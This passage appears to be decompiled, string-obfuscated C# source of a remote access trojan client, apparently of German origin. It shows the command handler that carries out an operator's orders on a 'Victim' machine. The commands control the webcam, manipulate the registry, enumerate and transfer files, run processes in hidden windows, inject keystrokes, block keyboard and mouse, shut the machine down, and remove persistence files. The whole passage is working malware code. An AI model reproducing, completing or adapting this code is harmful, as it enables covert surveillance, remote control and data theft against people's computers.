          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("BŪɣ͢Ѹծٝݬ\u086A।੧୨ూൢ\u0E71ཱུ"), false) == 0)
      {
        try
        {
          this.RemoteWebcam.Geschwindigkeit = Conversions.ToInteger(Befehle[1]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Cŵɢ͡ѹթٜݯ\u086B५੦୫\u0C54\u0D71\u0E62\u0F6Eၨ"), false) == 0)
      {
        try
        {
          this.RemoteWebcam.Qualität = Conversions.ToInteger(Befehle[1]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Cŵɢ͡ѹթٜݯ\u086B५੦୫ౖ\u0D70\u0E6Cིၱ"), false) == 0)
      {
        try
        {
          this.RemoteWebcam.Stopp();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("[ŭɤͩѫժ٦ݡ\u0875"), false) == 0)
      {
        try
        {
          this.Client.Reconnect();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("AŻɫ͵"), false) == 0)
      {
        try
        {
          if (Module2.Persistenz)
          {
            try
            {
              Process[] processesByName = Process.GetProcessesByName(\u003F0\u003F.\u003F1\u003F("vŲɹ"));
              int index = 0;
              while (index < processesByName.Length)
              {
                processesByName[index].Kill();
                checked { ++index; }
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              MyProject.Computer.FileSystem.DeleteFile(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("fŶɵ͠Ѣն٠")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ"));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            try
            {
              MyProject.Computer.FileSystem.DeleteFile(Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ")) + \u003F0\u003F.\u003F1\u003F("TŲɶͽЪզٺݤ"));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          this.Client.Deisconnect();
          Application.Exit();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("FŨɪ͡Ѫ"), false) == 0)
      {
        try
        {
          Module1.MausKlick(Conversions.ToInteger(Befehle[1]), Conversions.ToInteger(Befehle[2]), \u003F0\u003F.\u003F1\u003F("s"));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("IŵɡͭсՅ"), false) == 0)
      {
        try
        {
          this.FunFunktionen.CD_Laufwerk_öffnen();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("DŪɪͷѦՁم"), false) == 0)
      {
        try
        {
          this.FunFunktionen.CD_Laufwerk_schließen();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("OůɥͭѳՔ٠ݣࡈ१\u0A78"), false) == 0)
      {
        try
        {
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("YśɊ͗ђՏه\u074B࡚ज़ੂ\u0B55ౚ\u0D56์ཌྷၕ"), false) == 0)
            MyProject.Computer.Registry.ClassesRoot.DeleteSubKey(Befehle[2]);
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("YśɊ͗ђՏٞݘ्࡛\u0A49\u0B52ౚ\u0D51๐ཇၓ"), false) == 0)
            MyProject.Computer.Registry.CurrentUser.DeleteSubKey(Befehle[2]);
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("ZŚɕ͖ёՁك݈ࡋॅ\u0A57\u0B4Aేെ์ཊ၌ᅄ"), false) == 0)
            MyProject.Computer.Registry.LocalMachine.DeleteSubKey(Befehle[2]);
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("Błɍ͞љՐ݆ٗࡐ॒"), false) == 0)
            MyProject.Computer.Registry.Users.DeleteSubKey(Befehle[2]);
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("[řɔ͉ѐՍ٘ݞ࡙ॏੇଡ଼ౘ\u0D45๊ཊ၅ᅋቆ"), false) == 0)
            MyProject.Computer.Registry.CurrentConfig.DeleteSubKey(Befehle[2]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Gŭɰ͔Ѡգوݧ\u0878"), false) == 0)
      {
        try
        {
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("YśɊ͗ђՏه\u074B࡚ज़ੂ\u0B55ౚ\u0D56์ཌྷၕ"), false) == 0)
            MyProject.Computer.Registry.ClassesRoot.CreateSubKey(Befehle[2]);
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("YśɊ͗ђՏٞݘ्࡛\u0A49\u0B52ౚ\u0D51๐ཇၓ"), false) == 0)
            MyProject.Computer.Registry.CurrentUser.CreateSubKey(Befehle[2]);
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("ZŚɕ͖ёՁك݈ࡋॅ\u0A57\u0B4Aేെ์ཊ၌ᅄ"), false) == 0)
            MyProject.Computer.Registry.LocalMachine.CreateSubKey(Befehle[2]);
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("Błɍ͞љՐ݆ٗࡐ॒"), false) == 0)
            MyProject.Computer.Registry.Users.CreateSubKey(Befehle[2]);
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("[řɔ͉ѐՍ٘ݞ࡙ॏੇଡ଼ౘ\u0D45๊ཊ၅ᅋቆ"), false) == 0)
            MyProject.Computer.Registry.CurrentConfig.CreateSubKey(Befehle[2]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("FŢɱ͓ѥկٷݤ"), false) == 0)
      {
        try
        {
          MyProject.Computer.Registry.SetValue(Befehle[1], Befehle[2], (object) Befehle[3]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Oůɥͭѳգٓݥ\u086Fॷ\u0A64"), false) == 0)
      {
        try
        {
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("YśɊ͗ђՏه\u074B࡚ज़ੂ\u0B55ౚ\u0D56์ཌྷၕ"), false) == 0)
            MyProject.Computer.Registry.ClassesRoot.DeleteValue(Befehle[2]);
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("YśɊ͗ђՏٞݘ्࡛\u0A49\u0B52ౚ\u0D51๐ཇၓ"), false) == 0)
            MyProject.Computer.Registry.CurrentUser.CreateSubKey(Befehle[2]).DeleteValue(Befehle[3]);
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("ZŚɕ͖ёՁك݈ࡋॅ\u0A57\u0B4Aేെ์ཊ၌ᅄ"), false) == 0)
            MyProject.Computer.Registry.LocalMachine.CreateSubKey(Befehle[2]).DeleteValue(Befehle[3]);
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("Błɍ͞љՐ݆ٗࡐ॒"), false) == 0)
            MyProject.Computer.Registry.Users.CreateSubKey(Befehle[2]).DeleteValue(Befehle[3]);
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("[řɔ͉ѐՍ٘ݞ࡙ॏੇଡ଼ౘ\u0D45๊ཊ၅ᅋቆ"), false) == 0)
            MyProject.Computer.Registry.CurrentConfig.CreateSubKey(Befehle[2]).DeleteValue(Befehle[3]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("ZūɵͣѠժٌݤ\u0867"), false) == 0)
      {
        try
        {
          this.FunFunktionen.MonitorAusschalten();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("KŶɣ́ѭչ"), false) == 0)
      {
        try
        {
          new Thread((ParameterizedThreadStart) (a0 =>
          {
            object obj = a0;
            Module1.MsgBoxDetaills msgBoxDetaills;
            Module1.MesboxShow(obj != null ? (Module1.MsgBoxDetaills) obj : msgBoxDetaills);
          }))
          {
            IsBackground = true
          }.Start((object) new Module1.MsgBoxDetaills()
          {
            Titel = Befehle[1],
            Text = Befehle[2],
            Style = Befehle[3]
          });
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("[Ťɴ͠ѡխٍݯ"), false) == 0)
      {
        try
        {
          this.FunFunktionen.MonitorEinschalten();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("OŠɤͩѢՅ٨ݳ\u0876ॡੈ୧\u0C78"), false) == 0)
      {
        try
        {
          this.FunFunktionen.TastaturMaus_Bloeckieren();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("OŧɼͥѪժ٧ݨ\u0867९"), false) == 0)
      {
        try
        {
          this.FunFunktionen.TastaturMaus_Entblocken();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("[ůɳͱрլٵݯ"), false) == 0)
      {
        try
        {
          this.FunFunktionen.Runterfahren();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("JŪɣ͌ѷյ"), false) == 0)
      {
        try
        {
          this.FunFunktionen.Abmelden();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("]ūɾ\u0378Ѫոٽ\u074B\u0868५ੵୱ\u0C77൧\u0E73"), false) == 0)
      {
        try
        {
          this.FunFunktionen.NeuStarten();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Eũɲ͠Ѳաٱݩ\u0864"), false) == 0)
      {
        try
        {
          string str = \u003F0\u003F.\u003F1\u003F("AŭɾͬѾխٵݭ\u0860धਨ\u0B29ఢ");
          try
          {
            foreach (DriveInfo drive in MyProject.Computer.FileSystem.Drives)
              str = str + drive.Name + \u003F0\u003F.\u003F1\u003F("}ĩɿ");
          }
          finally
          {
            IEnumerator<DriveInfo> enumerator;
            enumerator?.Dispose();
          }
          this.Client.Senden(str + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢") + Interaction.Environ(\u003F0\u003F.\u003F1\u003F("pŦɯͱ")) + \u003F0\u003F.\u003F1\u003F("XŽȩͿ") + Interaction.Environ(\u003F0\u003F.\u003F1\u003F("fŶɵ͠Ѣն٠")) + \u003F0\u003F.\u003F1\u003F("XŽȩͿ") + Interaction.Environ(\u003F0\u003F.\u003F1\u003F("qŬɪͧѫճ")) + \u003F0\u003F.\u003F1\u003F("XŽȩͿ") + Interaction.Environ(\u003F0\u003F.\u003F1\u003F("~Źɬͺѷմ٪ݢ\u086A८\u0A64")) + \u003F0\u003F.\u003F1\u003F("XŽȩͿ") + MyProject.Computer.FileSystem.SpecialDirectories.Desktop + \u003F0\u003F.\u003F1\u003F("XŽȩͿ") + MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + \u003F0\u003F.\u003F1\u003F("XŽȩͿ") + MyProject.Computer.FileSystem.SpecialDirectories.MyPictures + \u003F0\u003F.\u003F1\u003F("XŽȩͿ") + MyProject.Computer.FileSystem.SpecialDirectories.MyMusic + \u003F0\u003F.\u003F1\u003F("XŽȩͿ"));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("AŹɿ\u0378ъըٿݠࡃ१\u0A44୮\u0C75\u0D71\u0E72ཪၧᅶ"), false) == 0)
      {
        try
        {
          Module2.VictimID = Befehle[1];
          this.ShowScreenInListview.Start();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Hūɹ͈Ѣոٺݩ\u0869ॢ\u0A43୭౯൧\u0E72"), false) == 0)
      {
        try
        {
          string directory1 = Befehle[1];
          string str1 = \u003F0\u003F.\u003F1\u003F("Tŷɥ͔Ѧռپݭ\u0865८\u0A4Fୡ౫ൣ\u0E76༧ဨᄩሢ");
          try
          {
            foreach (string directory2 in MyProject.Computer.FileSystem.GetDirectories(directory1))
            {
              DirectoryInfo directoryInfo = new DirectoryInfo(directory2);
              str1 = str1 + directoryInfo.Name + \u003F0\u003F.\u003F1\u003F("\\żɞ");
              str1 = str1 + directoryInfo.FullName + \u003F0\u003F.\u003F1\u003F("\\żɞ");
              str1 += \u003F0\u003F.\u003F1\u003F("FźɣͨѠնٜݼ࡞");
              str1 = str1 + directoryInfo.Attributes.ToString() + \u003F0\u003F.\u003F1\u003F("}ĩɿ");
            }
          }
          finally
          {
            IEnumerator<string> enumerator;
            enumerator?.Dispose();
          }
          string str2 = str1 + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
          try
          {
            foreach (string file in MyProject.Computer.FileSystem.GetFiles(directory1))
            {
              FileInfo fileInfo = new FileInfo(file);
              str2 = str2 + fileInfo.Name + \u003F0\u003F.\u003F1\u003F("\\żɞ");
              str2 = str2 + fileInfo.FullName + \u003F0\u003F.\u003F1\u003F("\\żɞ");
              str2 = str2 + fileInfo.Length.ToString() + \u003F0\u003F.\u003F1\u003F(")ŊɾͲѠշٜݼ࡞");
              str2 = str2 + fileInfo.Attributes.ToString() + \u003F0\u003F.\u003F1\u003F("}ĩɿ");
            }
          }
          finally
          {
            IEnumerator<string> enumerator;
            enumerator?.Dispose();
          }
          this.Client.Senden(\u003F0\u003F.\u003F1\u003F("Tŷɥ͔Ѧռپݭ\u0865८\u0A4Fୡ౫ൣ\u0E76༧ဨᄩሢ") + str2);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Vŵɻ͈Ѥ\u0560ٮ\u074C\u087B१੪\u0B45౩൭\u0E66ཬၵ"), false) == 0)
      {
        try
        {
          Module2.VictimID = Befehle[3];
          new Module1.FileSender()
          {
            VonHier = Befehle[1],
            NachHier = Befehle[2]
          }.Start();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("\\ūɿͺѮոٚݭ\u0869ॢ\u0A76ୂ౪൮\u0E64"), false) == 0)
      {
        try
        {
          Module1.FileGetter fileGetter = new Module1.FileGetter();
          Module2.VictimID = Befehle[3];
          fileGetter.vonhier = Befehle[2];
          fileGetter.nachhier = Befehle[1];
          fileGetter.Start();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Nŭɳ͔Ѡգوݧ\u0878"), false) == 0)
      {
        try
        {
          string Left1 = \u003F0\u003F.\u003F1\u003F("\u007FŘɿͫуբٿݶࠧन\u0A29ଢ");
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("YśɊ͗ђՏه\u074B࡚ज़ੂ\u0B55ౚ\u0D56์ཌྷၕ"), false) == 0)
          {
            RegistryKey registryKey = Registry.ClassesRoot.OpenSubKey(Befehle[2]);
            string[] subKeyNames = registryKey.GetSubKeyNames();
            int index1 = 0;
            while (index1 < subKeyNames.Length)
            {
              string str = subKeyNames[index1];
              Left1 = Left1 + str + \u003F0\u003F.\u003F1\u003F("}ĩɿ");
              checked { ++index1; }
            }
            Left1 += \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
            string[] valueNames = registryKey.GetValueNames();
            int index2 = 0;
            while (index2 < valueNames.Length)
            {
              string valueName = valueNames[index2];
              Left1 = Conversions.ToString(Operators.ConcatenateObject((object) Left1, Operators.ConcatenateObject(Operators.ConcatenateObject((object) (valueName + \u003F0\u003F.\u003F1\u003F("8Ļ")), Registry.GetValue(registryKey.Name, valueName, (object) \u003F0\u003F.\u003F1\u003F(""))), (object) \u003F0\u003F.\u003F1\u003F("}ĩɿ"))));
              checked { ++index2; }
            }
            this.Client.Senden(Left1 + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢") + Befehle[2] + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢") + Befehle[3] + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢"));
          }
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("YśɊ͗ђՏٞݘ्࡛\u0A49\u0B52ౚ\u0D51๐ཇၓ"), false) == 0)
          {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Befehle[2]);
            string[] subKeyNames = registryKey.GetSubKeyNames();
            int index3 = 0;
            while (index3 < subKeyNames.Length)
            {
              string str = subKeyNames[index3];
              Left1 = Left1 + str + \u003F0\u003F.\u003F1\u003F("}ĩɿ");
              checked { ++index3; }
            }
            Left1 += \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
            string[] valueNames = registryKey.GetValueNames();
            int index4 = 0;
            while (index4 < valueNames.Length)
            {
              string valueName = valueNames[index4];
              Left1 = Conversions.ToString(Operators.ConcatenateObject((object) Left1, Operators.ConcatenateObject(Operators.ConcatenateObject((object) (valueName + \u003F0\u003F.\u003F1\u003F("8Ļ")), Registry.GetValue(registryKey.Name, valueName, (object) \u003F0\u003F.\u003F1\u003F(""))), (object) \u003F0\u003F.\u003F1\u003F("}ĩɿ"))));
              checked { ++index4; }
            }
            this.Client.Senden(Left1 + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢") + Befehle[2] + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢") + Befehle[3] + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢"));
          }
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("ZŚɕ͖ёՁك݈ࡋॅ\u0A57\u0B4Aేെ์ཊ၌ᅄ"), false) == 0)
          {
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Befehle[2]);
            string[] subKeyNames = registryKey.GetSubKeyNames();
            int index5 = 0;
            while (index5 < subKeyNames.Length)
            {
              string str = subKeyNames[index5];
              Left1 = Left1 + str + \u003F0\u003F.\u003F1\u003F("}ĩɿ");
              checked { ++index5; }
            }
            Left1 += \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
            string[] valueNames = registryKey.GetValueNames();
            int index6 = 0;
            while (index6 < valueNames.Length)
            {
              string valueName = valueNames[index6];
              Left1 = Conversions.ToString(Operators.ConcatenateObject((object) Left1, Operators.ConcatenateObject(Operators.ConcatenateObject((object) (valueName + \u003F0\u003F.\u003F1\u003F("8Ļ")), Registry.GetValue(registryKey.Name, valueName, (object) \u003F0\u003F.\u003F1\u003F(""))), (object) \u003F0\u003F.\u003F1\u003F("}ĩɿ"))));
              checked { ++index6; }
            }
            this.Client.Senden(Left1 + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢") + Befehle[2] + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢") + Befehle[3] + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢"));
          }
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("Błɍ͞љՐ݆ٗࡐ॒"), false) == 0)
          {
            RegistryKey registryKey = Registry.Users.OpenSubKey(Befehle[2]);
            string[] subKeyNames = registryKey.GetSubKeyNames();
            int index7 = 0;
            while (index7 < subKeyNames.Length)
            {
              string str = subKeyNames[index7];
              Left1 = Left1 + str + \u003F0\u003F.\u003F1\u003F("}ĩɿ");
              checked { ++index7; }
            }
            Left1 += \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
            string[] valueNames = registryKey.GetValueNames();
            int index8 = 0;
            while (index8 < valueNames.Length)
            {
              string valueName = valueNames[index8];
              Left1 = Conversions.ToString(Operators.ConcatenateObject((object) Left1, Operators.ConcatenateObject(Operators.ConcatenateObject((object) (valueName + \u003F0\u003F.\u003F1\u003F("8Ļ")), Registry.GetValue(registryKey.Name, valueName, (object) \u003F0\u003F.\u003F1\u003F(""))), (object) \u003F0\u003F.\u003F1\u003F("}ĩɿ"))));
              checked { ++index8; }
            }
            this.Client.Senden(Left1 + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢") + Befehle[2] + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢") + Befehle[3] + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢"));
          }
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("[řɔ͉ѐՍ٘ݞ࡙ॏੇଡ଼ౘ\u0D45๊ཊ၅ᅋቆ"), false) == 0)
          {
            RegistryKey registryKey = Registry.CurrentConfig.OpenSubKey(Befehle[2]);
            string[] subKeyNames = registryKey.GetSubKeyNames();
            int index9 = 0;
            while (index9 < subKeyNames.Length)
            {
              string str = subKeyNames[index9];
              Left1 = Left1 + str + \u003F0\u003F.\u003F1\u003F("}ĩɿ");
              checked { ++index9; }
            }
            string Left2 = Left1 + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢");
            string[] valueNames = registryKey.GetValueNames();
            int index10 = 0;
            while (index10 < valueNames.Length)
            {
              string valueName = valueNames[index10];
              Left2 = Conversions.ToString(Operators.ConcatenateObject((object) Left2, Operators.ConcatenateObject(Operators.ConcatenateObject((object) (valueName + \u003F0\u003F.\u003F1\u003F("8Ļ")), Registry.GetValue(registryKey.Name, valueName, (object) \u003F0\u003F.\u003F1\u003F(""))), (object) \u003F0\u003F.\u003F1\u003F("}ĩɿ"))));
              checked { ++index10; }
            }
            this.Client.Senden(Left2 + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢") + Befehle[2] + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢") + Befehle[3] + \u003F0\u003F.\u003F1\u003F("'Ĩȩ̢"));
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("MŬɼͅѧն١݈\u0867ॸ"), false) == 0)
      {
        try
        {
          string Text = \u003F0\u003F.\u003F1\u003F("Xſɫ̓Ѣտٶܧࠨऩਢ");
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("YśɊ͗ђՏه\u074B࡚ज़ੂ\u0B55ౚ\u0D56์ཌྷၕ"), false) == 0)
          {
            string[] subKeyNames = MyProject.Computer.Registry.ClassesRoot.GetSubKeyNames();
            int index = 0;
            while (index < subKeyNames.Length)
            {
              string str = subKeyNames[index];
              Text = Text + str + \u003F0\u003F.\u003F1\u003F("}ĩɿ");
              checked { ++index; }
            }
            this.Client.Senden(Text);
          }
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("YśɊ͗ђՏٞݘ्࡛\u0A49\u0B52ౚ\u0D51๐ཇၓ"), false) == 0)
          {
            string[] subKeyNames = MyProject.Computer.Registry.CurrentUser.GetSubKeyNames();
            int index = 0;
            while (index < subKeyNames.Length)
            {
              string str = subKeyNames[index];
              Text = Text + str + \u003F0\u003F.\u003F1\u003F("}ĩɿ");
              checked { ++index; }
            }
            this.Client.Senden(Text);
          }
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("ZŚɕ͖ёՁك݈ࡋॅ\u0A57\u0B4Aేെ์ཊ၌ᅄ"), false) == 0)
          {
            string[] subKeyNames = MyProject.Computer.Registry.LocalMachine.GetSubKeyNames();
            int index = 0;
            while (index < subKeyNames.Length)
            {
              string str = subKeyNames[index];
              Text = Text + str + \u003F0\u003F.\u003F1\u003F("}ĩɿ");
              checked { ++index; }
            }
            this.Client.Senden(Text);
          }
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("Błɍ͞љՐ݆ٗࡐ॒"), false) == 0)
          {
            string[] subKeyNames = MyProject.Computer.Registry.Users.GetSubKeyNames();
            int index = 0;
            while (index < subKeyNames.Length)
            {
              string str = subKeyNames[index];
              Text = Text + str + \u003F0\u003F.\u003F1\u003F("}ĩɿ");
              checked { ++index; }
            }
            this.Client.Senden(Text);
          }
          if (Operators.CompareString(Befehle[1], \u003F0\u003F.\u003F1\u003F("[řɔ͉ѐՍ٘ݞ࡙ॏੇଡ଼ౘ\u0D45๊ཊ၅ᅋቆ"), false) == 0)
          {
            string[] subKeyNames = MyProject.Computer.Registry.CurrentConfig.GetSubKeyNames();
            int index = 0;
            while (index < subKeyNames.Length)
            {
              string str = subKeyNames[index];
              Text = Text + str + \u003F0\u003F.\u003F1\u003F("}ĩɿ");
              checked { ++index; }
            }
            this.Client.Senden(Text);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Bšɫͪсեٷݧ\u0868"), false) == 0)
      {
        try
        {
          File.Delete(Befehle[1]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("Gŷɣͫтժٮݤ"), false) == 0)
      {
        try
        {
          if (Operators.CompareString(Befehle[2], \u003F0\u003F.\u003F1\u003F("0"), false) == 0)
            new Process() { StartInfo = { FileName = Befehle[1] } }.Start();
          else if (Operators.CompareString(Befehle[2], \u003F0\u003F.\u003F1\u003F("1"), false) == 0)
            new Process()
            {
              StartInfo = {
                FileName = Befehle[1],
                WindowStyle = ProcessWindowStyle.Hidden
              }
            }.Start();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("YŬɦͣяը٥ݤ\u0867ॲ"), false) == 0)
      {
        try
        {
          Module1.SendImages sendImages = new Module1.SendImages();
          Module2.VictimID = Befehle[2];
          sendImages.Pfad = Befehle[1];
          sendImages.Start();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("LŦɬ͢Ѭկٞݩ\u086B४ੵ\u0B65\u0C73൧\u0E73"), false) == 0)
      {
        try
        {
          Module1.ChangeWallpaper(Befehle[1]);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("[Ţɨ͡яզٻݲ"), false) == 0)
      {
        try
        {
          SendKeys.SendWait(Befehle[1].Replace(\u003F0\u003F.\u003F1\u003F("\\Ńɋ͐цՐٜ"), \u003F0\u003F.\u003F1\u003F("\u000Fċ")));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Operators.CompareString(Befehle[0], \u003F0\u003F.\u003F1\u003F("FŦɧͱ"), false) == 0)
      {
        try
        {
          int integer = Conversions.ToInteger(Befehle[1]);
          Console.Beep(Conversions.ToInteger(Befehle[2]), checked (integer * 1000));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
